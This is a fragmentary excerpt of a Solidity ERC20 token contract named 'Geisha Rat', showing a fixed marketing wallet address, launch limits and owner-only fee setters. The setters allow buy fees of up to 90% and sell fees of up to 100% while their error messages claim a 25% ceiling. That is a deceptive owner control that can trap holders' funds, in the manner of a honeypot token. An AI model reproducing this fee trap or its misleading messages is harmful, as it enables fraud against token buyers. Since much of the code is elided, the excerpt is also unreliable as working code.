...
contract GeishaRat is Context, IERC20, Ownable {
    ...
    string private constant _name = "Geisha Rat";
    string private constant _symbol = "GeishaRat";
    ...
    uint256 public swapTokenAtAmount = 2500_000 * 10**_decimals;

    uint256 public launchEpoch;
    bool public launched;

    address public liquidityReceiver;
    address public marketingWallet = address(0xb99Fdca098B91a7E7336494eCD827AE8c3FcC351);
    ...
    function setBuyFees(uint256 feeMarketing, uint256 feeLiquidity) public onlyOwner {
        require(feeMarketing + feeLiquidity <= 90, "Fees should not exceed 25%.");
    ...
    function setSellFees(uint256 feeMarketing, uint256 feeLiquidity) public onlyOwner {
        require(feeMarketing + feeLiquidity <= 100, "Fees should not exceed 25%.");
    ...
    function _transfer(
        ...
        if(launched && block.timestamp > launchEpoch + 60 && !readyToLaunch) {
            _maxWalletAmount = 100_000_000 * 10**_decimals;
            _maxTxAmount = 100_000_000 * 10**_decimals;
